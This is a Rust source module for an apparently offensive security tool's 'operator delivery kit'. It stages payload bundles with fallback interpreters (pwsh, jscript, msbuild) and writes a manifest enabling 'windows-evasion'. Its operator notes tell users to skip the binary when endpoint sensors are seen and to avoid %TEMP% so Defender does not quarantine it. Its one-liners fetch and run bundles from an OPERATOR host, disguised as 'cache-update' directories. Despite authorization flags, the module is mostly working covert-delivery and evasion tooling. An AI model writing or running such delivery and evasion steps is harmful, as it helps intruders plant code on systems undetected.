//! Operator delivery kit: stage, verify, one-liners.

use std::fs;
use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use sha2::{Digest, Sha256};

use crate::core::artifacts::{self, ArtifactLedger};

pub fn sha256_file(path: &Path) -> Result<String> {
    let data = fs::read(path).with_context(|| format!("read {}", path.display()))?;
    let mut hasher = Sha256::new();
    hasher.update(&data);
    Ok(hex::encode(hasher.finalize()))
}

pub fn verify_local(path: &Path, expect_sha256: &str) -> Result<()> {
    let got = sha256_file(path)?;
    let expect = expect_sha256.trim().to_ascii_lowercase();
    if got != expect {
        bail!(
            "hash mismatch for {}: expected {}, got {}",
            path.display(),
            expect,
            got
        );
    }
    Ok(())
}

pub fn verify_ssh(ssh_target: &str, remote_path: &str, expect_sha256: &str) -> Result<()> {
    validate_ssh_target(ssh_target)?;
    let quoted_path = shell_quote(remote_path)?;
    let output = crate::core::command::trusted_command("ssh")
        .args([
            ssh_target,
            &format!("sha256sum {quoted_path} || shasum -a 256 {quoted_path}"),
        ])
        .output()
        .context("spawn ssh for remote verify")?;
    verify_ssh_response(
        output.status.success(),
        &output.stdout,
        &output.stderr,
        expect_sha256,
    )
}

fn verify_ssh_response(
    success: bool,
    stdout: &[u8],
    stderr: &[u8],
    expect_sha256: &str,
) -> Result<()> {
    if !success {
        bail!("remote hash failed: {}", String::from_utf8_lossy(stderr));
    }
    let stdout = String::from_utf8_lossy(stdout);
    let got = stdout
        .split_whitespace()
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    let expect = expect_sha256.trim().to_ascii_lowercase();
    if got != expect {
        bail!("remote hash mismatch: expected {expect}, got {got}");
    }
    Ok(())
}

fn validate_ssh_target(target: &str) -> Result<()> {
    let target = target.trim();
    if target.is_empty() {
        bail!("SSH target must be non-empty");
    }
    if target.starts_with('-') {
        bail!("SSH target must not begin with '-' (options are not accepted)");
    }
    if target.bytes().any(|b| b == 0 || b == b'\n' || b == b'\r') {
        bail!("SSH target must not contain NUL/newline characters");
    }
    Ok(())
}

fn shell_quote(value: &str) -> Result<String> {
    if value.is_empty() || value.bytes().any(|b| b == 0 || b == b'\n' || b == b'\r') {
        bail!("remote path must be non-empty and contain no NUL/newline characters");
    }
    Ok(format!("'{}'", value.replace('\'', "'\\''")))
}

pub struct StageOptions<'a> {
    pub os: &'a str,
    pub arch: &'a str,
    pub name: &'a str,
    pub out_dir: &'a Path,
    pub binary: Option<&'a Path>,
    pub target_hostname: &'a str,
    pub target_username: Option<&'a str>,
    pub run_id: &'a str,
    pub ledger_dir: &'a Path,
}

pub fn stage(opts: StageOptions<'_>) -> Result<PathBuf> {
    validate_manifest_value(opts.target_hostname, "target hostname", true)?;
    if let Some(username) = opts.target_username {
        validate_manifest_value(username, "target username", false)?;
    }
    validate_bundle_name(opts.name)?;
    if let Some(src) = opts.binary {
        let metadata = fs::metadata(src)
            .with_context(|| format!("read staged binary metadata {}", src.display()))?;
        if !metadata.is_file() {
            bail!("staged binary is not a file: {}", src.display());
        }
    }

    let scripts_rel = if opts.os == "windows" {
        "scripts/windows"
    } else {
        "scripts/linux"
    };
    let mut candidates = vec![PathBuf::from(scripts_rel)];
    #[cfg(debug_assertions)]
    {
        candidates.push(
            PathBuf::from(env!("CARGO_MANIFEST_DIR"))
                .join("../../")
                .join(scripts_rel),
        );
    }
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            candidates.push(dir.join(scripts_rel));
            candidates.push(dir.join("../").join(scripts_rel));
            candidates.push(dir.join("../../").join(scripts_rel));
            candidates.push(dir.join("../../../").join(scripts_rel));
        }
    }
    let scripts_src = candidates
        .into_iter()
        .find(|path| path.is_dir())
        .ok_or_else(|| anyhow::anyhow!("required fallback directory not found: {scripts_rel}"))?;

    if opts.out_dir.exists() {
        if !opts.out_dir.is_dir() {
            bail!(
                "stage output is not a directory: {}",
                opts.out_dir.display()
            );
        }
        if fs::read_dir(opts.out_dir)?.next().transpose()?.is_some() {
            bail!(
                "stage output directory must be empty: {}",
                opts.out_dir.display()
            );
        }
    }
    fs::create_dir_all(opts.out_dir)?;
    let bin_name = if opts.os == "windows" {
        format!("{}.exe", opts.name)
    } else {
        opts.name.to_string()
    };
    let stage_root = fs::canonicalize(opts.out_dir)?;
    let dest_bin = stage_root.join(&bin_name);
    if dest_bin.parent() != Some(stage_root.as_path()) {
        bail!("staged binary must remain inside the stage directory");
    }

    let bundle_mode = if opts.binary.is_some() {
        "native-with-fallbacks"
    } else {
        "script-only"
    };
    if let Some(src) = opts.binary {
        fs::copy(src, &dest_bin)
            .with_context(|| format!("copy {} -> {}", src.display(), dest_bin.display()))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(&dest_bin)?.permissions();
            perms.set_mode(0o750);
            fs::set_permissions(&dest_bin, perms)?;
        }
    }

    // Copy script fallbacks. Prefer cwd / exe-adjacent paths (no
    // absolute build-machine CARGO_MANIFEST_DIR embedding in release binaries).
    let scripts_dst = stage_root.join("scripts");
    fs::create_dir_all(&scripts_dst)?;
    copy_dir_recursive(&scripts_src, &scripts_dst, opts.os == "linux")?;

    let fallback_order = if opts.os == "windows" {
        "python,pwsh,powershell,git,jscript,msbuild"
    } else {
        "python,bash,sh,perl"
    };
    let manifest = format!(
        "# Generated dispatcher manifest — inherits the primary-run authorization context.\n\
         manifest_version=1\n\
         authorization_ack=true\n\
         operator_ack_required=true\n\
         allow_fallback=true\n\
         roe_ref=INHERITED_PRIMARY_RUN\n\
         execution_mode=enumerate-only\n\
         bundle_mode={bundle_mode}\n\
         target_hostname={target_hostname}\n\
         target_username={target_username}\n\
         drop_dir=\n\
         primary_binary={primary_binary}\n\
         script_first=auto\n\
         shipped_features={shipped_features}\n\
         {os_key}_fallbacks={fallback_order}\n",
        os_key = if opts.os == "windows" {
            "windows"
        } else {
            "linux"
        },
        primary_binary = if opts.binary.is_some() { &bin_name } else { "" },
        shipped_features = if opts.os == "windows" {
            "windows-evasion"
        } else {
            ""
        },
        target_hostname = opts.target_hostname,
        target_username = opts.target_username.unwrap_or(""),
    );
    fs::write(scripts_dst.join("stealthy-run.conf"), manifest)
        .with_context(|| format!("write {} dispatcher manifest", opts.os))?;

    let hash = if opts.binary.is_some() {
        sha256_file(&dest_bin)?
    } else {
        "not-applicable".into()
    };
    let checksums = if opts.binary.is_some() {
        format!("{hash}  {bin_name}\n")
    } else {
        let mut files = Vec::new();
        collect_files_recursive(&scripts_dst, &mut files)?;
        files.sort();
        let mut body = String::from("# script-only bundle: no primary binary\n");
        for path in files {
            let relative = path
                .strip_prefix(&stage_root)
                .with_context(|| format!("resolve staged path {}", path.display()))?
                .to_string_lossy()
                .replace('\\', "/");
            body.push_str(&format!("{}  {relative}\n", sha256_file(&path)?));
        }
        body
    };
    fs::write(opts.out_dir.join("SHA256SUMS"), checksums)?;

    let verification = if opts.binary.is_some() {
        format!("Verify primary binary:\n  stealthy verify --path ./{bin_name} --expect-sha256 {hash}\n")
    } else {
        "Primary binary: not included (script-only bundle)\nVerify: compare every staged script against SHA256SUMS before execution.\n".into()
    };
    let operator = if opts.os == "windows" {
        format!(
            "{} stage bundle\n\
             os={} arch={} name={} mode={}\n\
             binary_sha256={}\n\n\
             {}\n\
             Enumerate (requires a fresh operator acknowledgment):\n  & ./scripts/run.ps1 --authorized --profile balanced enum\n\n\
             script_first=auto skips the PE when a live endpoint sensor is observed.\n\
             Set script_first=false (or STEALTHY_SCRIPT_FIRST=false) to try the PE first.\n\
             If the PE is missing or quarantined by AV:\n  Prefer a non-TEMP drop path and a lab path exclusion / org-signed PE.\n  & ./scripts/run.ps1 --authorized --profile balanced enum\n  (dispatcher walks windows_fallbacks: python,pwsh,powershell,git,jscript,msbuild)\n  Script tiers are reduced coverage; only auth and --json/-Json are forwarded.\n\n\
             Lab tip: avoid %TEMP% for the kit; Public\\Documents\\<name> is quieter.\n\n\
             Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
            crate::core::opsec::BRAND,
            opts.os, opts.arch, opts.name, bundle_mode, hash, verification
        )
    } else {
        format!(
            "{} stage bundle\n\
             os={} arch={} name={} mode={}\n\
             binary_sha256={}\n\n\
             {}\n\
             Enumerate (requires a fresh operator acknowledgment):\n  bash ./scripts/run.sh --authorized --profile balanced enum\n\n\
             Empty drop_dir runs the ELF in place (no copy into .run-cache).\n\
             script_first=auto skips the ELF when a live sensor or noexec mount is observed.\n\
             Set script_first=false (or STEALTHY_SCRIPT_FIRST=false) to try the ELF first.\n\
             If the ELF is missing or blocked:\n  bash ./scripts/run.sh --authorized --profile balanced enum\n  (dispatcher walks linux_fallbacks: python,bash,sh,perl)\n  Script tiers are reduced coverage; only auth and --json are forwarded.\n\n\
             Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
            crate::core::opsec::BRAND,
            opts.os, opts.arch, opts.name, bundle_mode, hash, verification
        )
    };
    fs::write(opts.out_dir.join("OPERATOR.txt"), operator)?;

    let mut ledger = ArtifactLedger::new(opts.run_id);
    ledger.register("stage_bundle", opts.out_dir, true, "staged delivery bundle");
    if opts.binary.is_some() {
        ledger.register("binary_drop", &dest_bin, true, "staged binary");
    }
    ledger.register(
        "stage_bundle",
        opts.out_dir.join("SHA256SUMS"),
        true,
        "checksums",
    );
    artifacts::save_ledger(opts.ledger_dir, &ledger)?;
    Ok(opts.out_dir.to_path_buf())
}

fn validate_manifest_value(value: &str, label: &str, required: bool) -> Result<()> {
    let value = value.trim();
    if required && value.is_empty() {
        bail!("{label} must be non-empty");
    }
    if value.eq_ignore_ascii_case("AUTO")
        || value.eq_ignore_ascii_case("REQUIRED")
        || value.eq_ignore_ascii_case("SET_TARGET_HOSTNAME")
    {
        bail!("{label} must be explicit");
    }
    if value
        .bytes()
        .any(|byte| byte == 0 || byte == b'\n' || byte == b'\r' || byte == b'=')
    {
        bail!("{label} contains unsupported manifest characters");
    }
    Ok(())
}

fn validate_bundle_name(name: &str) -> Result<()> {
    if name.is_empty()
        || name == "."
        || name == ".."
        || name
            .chars()
            .any(|c| c.is_control() || matches!(c, '/' | '\\' | ':'))
    {
        bail!("stage name must be a safe file basename without path separators");
    }
    Ok(())
}

fn copy_dir_recursive(src: &Path, dst: &Path, normalize_linux_text: bool) -> Result<()> {
    fs::create_dir_all(dst)?;
    for ent in fs::read_dir(src)? {
        let ent = ent?;
        let name = ent.file_name();
        if name == "__pycache__" || ent.path().extension().is_some_and(|ext| ext == "pyc") {
            continue;
        }
        let ty = ent.file_type()?;
        let to = dst.join(name);
        if ty.is_dir() {
            copy_dir_recursive(&ent.path(), &to, normalize_linux_text)?;
        } else if ty.is_file() {
            fs::copy(ent.path(), &to)?;
            if normalize_linux_text
                && to
                    .extension()
                    .is_some_and(|ext| matches!(ext.to_str(), Some("sh" | "py" | "pl")))
            {
                let body = fs::read(&to)?;
                if body.windows(2).any(|pair| pair == b"\r\n") {
                    let mut normalized = Vec::with_capacity(body.len());
                    let mut index = 0;
                    while index < body.len() {
                        if body.get(index..index + 2) == Some(b"\r\n") {
                            normalized.push(b'\n');
                            index += 2;
                        } else {
                            normalized.push(body[index]);
                            index += 1;
                        }
                    }
                    fs::write(&to, normalized)?;
                }
            }
        }
    }
    Ok(())
}

fn collect_files_recursive(root: &Path, files: &mut Vec<PathBuf>) -> Result<()> {
    for entry in fs::read_dir(root)? {
        let entry = entry?;
        let path = entry.path();
        let kind = entry.file_type()?;
        if kind.is_dir() {
            collect_files_recursive(&path, files)?;
        } else if kind.is_file() {
            files.push(path);
        }
    }
    Ok(())
}

pub fn one_liners(os: &str, transport: &str) -> String {
    match (os, transport) {
        ("linux", "ssh") | ("linux", "scp") => r#"# SCP approved bundle + dispatcher (replace host/path per ROE; avoid /tmp when noexec)
ssh user@host 'mkdir -p "$HOME/.cache/cache-update"'
scp -r ./drop/. user@host:.cache/cache-update/
ssh user@host 'bash "$HOME/.cache/cache-update/scripts/run.sh" --authorized --profile quiet enum'
"#.into(),
        ("linux", "http") => r#"# HTTP pull of an approved bundle (operator-hosted; not GitHub)
mkdir -p "$HOME/.cache/cache-update"
curl -fsSL http://OPERATOR:8000/drop.tar.gz | tar -xz -C "$HOME/.cache/cache-update"
bash "$HOME/.cache/cache-update/scripts/run.sh" --authorized --profile quiet enum
"#.into(),
        ("windows", "ssh") | ("windows", "scp") => r#"# OpenSSH SCP of approved bundle + dispatcher (keep the PE out of %TEMP%)
ssh user@host "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path 'C:\Users\Public\Documents\cache-update' | Out-Null\""
scp -r ./drop/. user@host:C:/Users/Public/Documents/cache-update/
ssh user@host "powershell -NoProfile -File C:\Users\Public\Documents\cache-update\scripts\run.ps1 --authorized --profile quiet enum"
"#.into(),
        ("windows", "winrm") => r#"# WinRM session copy + policy-bound dispatcher (no C$ required)
$RemoteDir = 'C:\Users\Public\Documents\cache-update'
$s = New-PSSession -ComputerName HOST -Credential (Get-Credential)
Invoke-Command -Session $s -ScriptBlock { param($Dir) New-Item -ItemType Directory -Force -Path $Dir | Out-Null } -ArgumentList $RemoteDir
Copy-Item -ToSession $s -Path .\drop\* -Destination $RemoteDir -Recurse -Force
Invoke-Command -Session $s -ScriptBlock { param($Dir) & (Join-Path $Dir 'scripts\run.ps1') --authorized --profile quiet enum } -ArgumentList $RemoteDir
Remove-PSSession $s
"#.into(),
        ("windows", "smb") => r#"# SMB approved bundle + dispatcher
$Dir = '\\HOST\C$\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item -Recurse .\drop\* $Dir
Invoke-Command -ComputerName HOST -ScriptBlock {
  & 'C:\Users\Public\Documents\cache-update\scripts\run.ps1' --authorized --profile quiet enum
}
"#.into(),
        ("windows", "http") => r#"# HTTP pull on Windows (avoid %TEMP%: Defender often quarantines fresh PEs there)
$Dir = Join-Path $env:PUBLIC 'Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Invoke-WebRequest -Uri http://OPERATOR:8000/drop.zip -OutFile (Join-Path $Dir 'drop.zip')
Expand-Archive -Force (Join-Path $Dir 'drop.zip') $Dir
& (Join-Path $Dir 'scripts\run.ps1') --authorized --profile quiet enum
"#.into(),
        ("linux", "smb") => r#"# Copy from mounted engagement share
mkdir -p "$HOME/.cache/cache-update"
cp -R /mnt/engagement-share/drop/. "$HOME/.cache/cache-update/"
bash "$HOME/.cache/cache-update/scripts/run.sh" --authorized --profile quiet enum
"#.into(),
        _ => format!(
            "# No built-in snippet for os={os} transport={transport}\n# Supported: linux:(ssh|scp|http|smb) windows:(ssh|scp|winrm|smb|http)\n"
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::{
        one_liners, sha256_file, shell_quote, stage, validate_bundle_name, validate_manifest_value,
        validate_ssh_target, verify_local, verify_ssh, verify_ssh_response, StageOptions,
    };

    #[test]
    fn shell_quote_contains_metacharacters_as_data() {
        let quoted = shell_quote("a' ; echo injected ; #").unwrap();
        assert_eq!(quoted, "'a'\\'' ; echo injected ; #'");
    }

    #[test]
    fn stage_name_rejects_path_components() {
        for name in ["../outside", r"sub\\file", "/tmp/file", "..", ""] {
            assert!(validate_bundle_name(name).is_err(), "accepted {name:?}");
        }
        assert!(validate_bundle_name("stealthy").is_ok());
    }

    #[test]
    fn ssh_target_rejects_options_and_control_characters() {
        for target in ["-oProxyCommand=echo bad", "", "host\nname"] {
            assert!(validate_ssh_target(target).is_err(), "accepted {target:?}");
        }
        assert!(validate_ssh_target("operator@example.test").is_ok());
    }

    #[test]
    fn verify_ssh_rejects_invalid_targets_before_process_launch() {
        let error = verify_ssh("-oProxyCommand=bad", "/approved/artifact", "00").unwrap_err();
        assert!(error.to_string().contains("options are not accepted"));
    }

    #[test]
    fn verify_ssh_response_covers_success_failure_and_mismatch() {
        let expected = "a".repeat(64);
        let output = format!("{expected}  /approved/artifact\n");
        assert!(verify_ssh_response(true, output.as_bytes(), b"", &expected).is_ok());
        assert!(
            verify_ssh_response(true, b"bad  /approved/artifact\n", b"", &expected)
                .unwrap_err()
                .to_string()
                .contains("remote hash mismatch")
        );
        assert!(
            verify_ssh_response(false, b"", b"connection refused", &expected)
                .unwrap_err()
                .to_string()
                .contains("connection refused")
        );
    }

    #[test]
    fn manifest_values_reject_reserved_and_unsafe_inputs() {
        for value in ["", "AUTO", "REQUIRED", "SET_TARGET_HOSTNAME"] {
            assert!(validate_manifest_value(value, "target hostname", true).is_err());
        }
        for value in ["host\nname", "host\rname", "host=name", "host\0name"] {
            assert!(validate_manifest_value(value, "target hostname", true).is_err());
        }
        assert!(validate_manifest_value("approved-host", "target hostname", true).is_ok());
        assert!(validate_manifest_value("", "target username", false).is_ok());
    }

    #[test]
    fn local_hashing_reports_missing_files() {
        let root = tempfile::tempdir().unwrap();
        let missing = root.path().join("missing");
        assert!(sha256_file(&missing).is_err());
        assert!(verify_local(&missing, "00").is_err());
    }

    #[test]
    fn windows_http_one_liner_avoids_temp() {
        let snippet = one_liners("windows", "http");
        assert!(snippet.contains("PUBLIC"));
        assert!(snippet.contains("Documents\\cache-update"));
        assert!(!snippet.contains("$env:TEMP\\stealthy-drop"));
    }

    #[test]
    fn linux_ssh_one_liner_avoids_tmp_drop() {
        let snippet = one_liners("linux", "ssh");
        assert!(snippet.contains("$HOME/.cache/cache-update"));
        assert!(!snippet.contains("/tmp/cache-update"));
        assert!(snippet.contains("authorized"));
    }

    #[test]
    fn windows_winrm_one_liner_uses_session_copy() {
        let snippet = one_liners("windows", "winrm");
        assert!(snippet.contains("Copy-Item -ToSession"));
        assert!(snippet.contains("New-PSSession"));
        assert!(snippet.contains("authorized"));
    }

    #[test]
    fn one_liners_cover_every_supported_transport() {
        for (os, transport) in [
            ("linux", "ssh"),
            ("linux", "scp"),
            ("linux", "http"),
            ("linux", "smb"),
            ("windows", "ssh"),
            ("windows", "scp"),
            ("windows", "winrm"),
            ("windows", "smb"),
            ("windows", "http"),
        ] {
            let snippet = one_liners(os, transport);
            assert!(!snippet.contains("No built-in snippet"), "{os}/{transport}");
            assert!(snippet.contains("authorized"), "{os}/{transport}");
        }
        assert!(one_liners("plan9", "telepathy").contains("No built-in snippet"));
    }

    #[test]
    fn stage_copies_real_binary_writes_manifest_and_verifies_hash() {
        let root = tempfile::tempdir().unwrap();
        let source = root.path().join("source.bin");
        std::fs::write(&source, b"fixture binary").unwrap();
        let out = root.path().join("drop");
        let ledger = root.path().join("ledger");
        stage(StageOptions {
            os: "linux",
            arch: "x86_64",
            name: "stealthy",
            out_dir: &out,
            binary: Some(&source),
            target_hostname: "approved-host",
            target_username: Some("operator"),
            run_id: "delivery-test",
            ledger_dir: &ledger,
        })
        .unwrap();
        let staged = out.join("stealthy");
        let hash = sha256_file(&staged).unwrap();
        verify_local(&staged, &hash).unwrap();
        assert!(verify_local(&staged, "00").is_err());
        let manifest = std::fs::read_to_string(out.join("scripts/stealthy-run.conf")).unwrap();
        assert!(manifest.contains("bundle_mode=native-with-fallbacks"));
        assert!(manifest.contains("primary_binary=stealthy"));
        assert!(manifest.contains("script_first=auto"));
        assert!(!out.join("scripts/__pycache__").exists());
        let dispatcher = std::fs::read(out.join("scripts/run.sh")).unwrap();
        assert!(!dispatcher.windows(2).any(|pair| pair == b"\r\n"));
        assert!(out.join("OPERATOR.txt").is_file());
        assert!(ledger.join("delivery-test.json").is_file());
    }

    #[test]
    fn stage_without_binary_creates_an_explicit_script_only_bundle() {
        let root = tempfile::tempdir().unwrap();
        let out = root.path().join("drop");
        let ledger = root.path().join("ledger");
        stage(StageOptions {
            os: "windows",
            arch: "x86_64",
            name: "stealthy",
            out_dir: &out,
            binary: None,
            target_hostname: "approved-host",
            target_username: None,
            run_id: "script-only-test",
            ledger_dir: &ledger,
        })
        .unwrap();
        assert!(!out.join("stealthy.exe").exists());
        let manifest = std::fs::read_to_string(out.join("scripts/stealthy-run.conf")).unwrap();
        assert!(manifest.contains("bundle_mode=script-only"));
        assert!(manifest.contains("\nprimary_binary=\n"));
        let sums = std::fs::read_to_string(out.join("SHA256SUMS")).unwrap();
        assert!(sums.starts_with("# script-only bundle: no primary binary\n"));
        assert!(sums.contains("  scripts/run.ps1\n"));
        assert!(sums.contains("  scripts/evasion.ps1\n"));
        assert!(!sums.contains("stealthy.exe"));
        assert!(manifest.contains("shipped_features=windows-evasion"));
        let evasion = std::fs::read_to_string(out.join("scripts/evasion.ps1")).unwrap();
        assert!(evasion.contains("feature = 'windows-evasion'"));
        assert!(evasion.contains("Test-EvasionAuthorization"));
        assert!(evasion.contains("ConfirmEvasion"));
        assert!(evasion.contains("status = $status"));
        assert!(evasion.contains("executed = $executed"));
        assert!(evasion.contains("modifies_controls = $modifiesControls"));
        let operator = std::fs::read_to_string(out.join("OPERATOR.txt")).unwrap();
        assert!(operator.contains("mode=script-only"));
        assert!(operator.contains("Primary binary: not included"));
    }

    #[test]
    fn stage_rejects_nonempty_or_nondirectory_destinations() {
        let root = tempfile::tempdir().unwrap();
        let ledger = root.path().join("ledger");
        let file = root.path().join("file-output");
        std::fs::write(&file, b"existing").unwrap();
        let nonempty = root.path().join("nonempty-output");
        std::fs::create_dir(&nonempty).unwrap();
        std::fs::write(nonempty.join("existing"), b"keep").unwrap();
        for out_dir in [&file, &nonempty] {
            let error = stage(StageOptions {
                os: "linux",
                arch: "x86_64",
                name: "stealthy",
                out_dir,
                binary: None,
                target_hostname: "approved-host",
                target_username: None,
                run_id: "invalid-output-test",
                ledger_dir: &ledger,
            })
            .unwrap_err();
            assert!(error.to_string().contains("stage output"));
        }
    }

    #[test]
    fn stage_rejects_invalid_inputs_before_creating_destination() {
        let root = tempfile::tempdir().unwrap();
        let ledger = root.path().join("ledger");
        let invalid_name_out = root.path().join("invalid-name");
        let error = stage(StageOptions {
            os: "linux",
            arch: "x86_64",
            name: "../escape",
            out_dir: &invalid_name_out,
            binary: None,
            target_hostname: "approved-host",
            target_username: None,
            run_id: "invalid-name-test",
            ledger_dir: &ledger,
        })
        .unwrap_err();
        assert!(error.to_string().contains("safe file basename"));
        assert!(!invalid_name_out.exists());

        let missing_binary_out = root.path().join("missing-binary");
        let missing_binary = root.path().join("missing");
        let error = stage(StageOptions {
            os: "linux",
            arch: "x86_64",
            name: "stealthy",
            out_dir: &missing_binary_out,
            binary: Some(&missing_binary),
            target_hostname: "approved-host",
            target_username: None,
            run_id: "missing-binary-test",
            ledger_dir: &ledger,
        })
        .unwrap_err();
        assert!(error.to_string().contains("staged binary metadata"));
        assert!(!missing_binary_out.exists());
        assert!(!ledger.exists());
    }
}
